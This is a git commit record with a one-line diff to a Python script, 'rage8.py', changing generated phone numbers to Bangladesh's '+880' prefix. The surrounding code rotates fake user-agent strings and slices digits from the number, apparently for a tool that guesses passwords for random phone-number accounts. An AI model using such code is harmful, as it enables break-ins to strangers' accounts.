d42319d4776a7e22b3f824f59eef2c1966bd560e
darknethaxor <72026007+darknethaxor@users.noreply.github.com>
2020-10-14 23:44:41 +0600

    Update rage8.py

--- rage8.py
+++ rage8.py
@@ -79,7 +79,7 @@ def logger():
         use1 = 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck', 'Google chrome', 'Fire fox'
         header = random.choice(use1)
         number = str(random.randint(1, 9999999))
-        full = "0" + adder + number + "\n"
+        full = "+880" + adder + number + "\n"
         lol = str(full)
         digi6 = lol[3:11]
         br.set_handle_referer(True)
